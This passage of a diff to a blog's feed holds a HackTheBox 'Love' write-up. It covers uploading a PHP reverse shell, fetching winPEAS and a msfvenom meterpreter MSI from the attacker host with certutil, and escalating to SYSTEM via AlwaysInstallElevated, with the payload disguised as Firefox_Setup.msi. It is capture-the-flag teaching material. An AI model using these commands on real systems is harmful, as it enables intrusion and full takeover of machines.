+&lt;p&gt;It is clear here based on the URL, that the server saves any uploaded image to the &lt;strong&gt;/image&lt;/strong&gt; path.&lt;/p&gt;
+&lt;p&gt;To succeed in the second mission we will try to upload a .php reverse shell. What we may encounter in general, are upload filters, however, as we will see, there are no filters in this particular box. The shell we are going to upload is found here (of course you can experiment with any shell found online, since there are many of them):&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php&#34;&gt;https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;After editing the php file to fill our own IP and port we want to listen to, uploading it and saving our changes, we get a success:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/21.png&#34; alt=&#34;Pasted image 20210805150453.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The last step would be to see if our shell is functional by visiting the &lt;strong&gt;/images/reverse_shell.php&lt;/strong&gt; path. Before that we should of course start our listener:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rlwrap nc -nvlp &lt;span class=&#34;m&#34;&gt;9001&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;As you noticed we used &lt;strong&gt;rlwrap&lt;/strong&gt;. The reason is this is a windows machine and it will be hard creating an interactive shell the way we would on a linux target. rlwrap (&lt;a href=&#34;https://github.com/hanslub42/rlwrap&#34;&gt;https://github.com/hanslub42/rlwrap&lt;/a&gt;) helps us making the shell somewhat interactive.
+Visiting &lt;strong&gt;10.10.10.239/images/reverse.php&lt;/strong&gt; we get a shell:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/22.png&#34; alt=&#34;Pasted image 20210805154319.png&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;Since we are now in the box, firing up &lt;strong&gt;winpeas&lt;/strong&gt; (&lt;a href=&#34;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&#34;&gt;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&lt;/a&gt;) is a perfect start to identify any vulnerability, so we transfer it to the target by using &lt;strong&gt;certutil.exe&lt;/strong&gt; after hosting it on a &lt;strong&gt;Python 3&lt;/strong&gt; simple server on our box:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;mkdir temp
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; temp
+certutil -urlcache -f &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.14.3/winpeas.exe&amp;#34;&lt;/span&gt; winpeas.exe
+.&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;inpeas.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;One of the advantages of winpeas, is that it will color code it&amp;rsquo;s findings based on severity. After scrolling a bit we see the following, color coded with red (an interesting find):&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/23.png&#34; alt=&#34;Pasted image 20210805161045.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It appears that the two above registry values of &lt;strong&gt;AlwaysInstallElevated&lt;/strong&gt; are set to 1. With a simple search about this we learn that we can use the AlwaysInstallElevated policy to install a &lt;strong&gt;Windows Installer Package&lt;/strong&gt; (&lt;strong&gt;.msi&lt;/strong&gt; files) with elevated (system) privileges. According to &lt;strong&gt;Microsoft&lt;/strong&gt;, this option is equivalent to granting full administrative rights, which can pose a massive security risk. By setting the following registry values:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer&lt;/li&gt;
+&lt;li&gt;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;to 1 (which we already have here) we are able to install &lt;strong&gt;.msi&lt;/strong&gt; files with System privileges.&lt;/p&gt;
+&lt;p&gt;At this point it is pretty clear what we have to do. We will create a malicious &lt;strong&gt;.msi&lt;/strong&gt; file, transfer it to the victim and execute it, in order to get an elevated shell. The tool we are going to use is of course msfvenom, and our payload of choice will be a &lt;strong&gt;meterpreter reverse tcp&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&#34;nv&#34;&gt;lhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10.10.14.3 &lt;span class=&#34;nv&#34;&gt;lport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;9002&lt;/span&gt; -f msi &amp;gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Firefox_Setup.msi&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;On the output we can just select a random name that will not raise suspicions. A Firefox setup package name will do the job just fine. Next step is hosting the malicious file and transfering it to the target:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;certutil -urlcache -f &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.14.3/Firefox_Setup.msi&amp;#34;&lt;/span&gt; Firefox_Setup.msi
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Before exeuting the file we of course need to start listening on port 9002 that we specified. We will open a handler on Metasploit, select the correct payload, and start listening:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfconsole
+use exploit/multi/handler
+&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp
+&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lhost 10.10.14.3
+&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;m&#34;&gt;9002&lt;/span&gt;
+run
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Last step is executing the malicious file. To install it, we are going to use &lt;strong&gt;msiexec&lt;/strong&gt; since we want full control over the installation process:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msiexec /quiet /qn /i Firefox_Setup.msi
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The options used here are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;/quiet&lt;/strong&gt;: This will suppress any messages during installation leading to a more clean output and requiring no user interaction.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/qn&lt;/strong&gt;: Specifies there&amp;rsquo;s no UI during the installation process.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;/i&lt;/strong&gt;: Specifies normal installation instead of an administrative one.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;After running the executable, we immediately get a meterpreter shell back as SYSTEM:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Love/24.png&#34; alt=&#34;Pasted image 20210805163948.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;useful-resources&#34;&gt;Useful Resources&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.sqreen.com/ssrf-explained/:&#34;&gt;https://blog.sqreen.com/ssrf-explained/:&lt;/a&gt; SSRF Explained&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf:&#34;&gt;https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf:&lt;/a&gt; More SSRF stuff including a cheatsheet.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/:&#34;&gt;https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/:&lt;/a&gt; AlwaysInstallElevated Tested&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+            
+            
+            
+                
+                
+                
+                    
+                    
+                    
+                        
+                            <category scheme="https://netuserdoomdesire.github.io/posts/writeups/" term="posts\Writeups\" label="posts\Writeups\" />
+                        
+                    
+                
+            
+            
+            
+                
+                    
+                
+                    
+                
+            
+        </entry>
+    
         <entry>
             <title type="text">Armageddon Writeup (HackTheBox)</title>
             <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/writeups/armageddon/" />
